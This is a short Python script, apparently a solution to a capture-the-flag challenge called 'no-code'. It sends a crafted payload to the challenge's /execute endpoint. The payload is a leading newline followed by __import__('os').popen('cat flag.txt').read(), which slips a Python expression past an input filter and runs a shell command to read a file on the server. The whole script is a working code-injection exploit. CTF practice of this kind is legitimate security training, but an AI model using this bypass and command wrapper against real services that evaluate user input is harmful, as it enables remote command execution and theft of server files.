#!/usr/bin/python3

import requests

url = "https://uoftctf-no-code.chals.io"

command = 'cat flag.txt'
wrapper = f"__import__('os').popen('{command}').read()"

payload = {"code" : "\n" + wrapper}

r = requests.post(url+"/execute", payload)

print(r.text)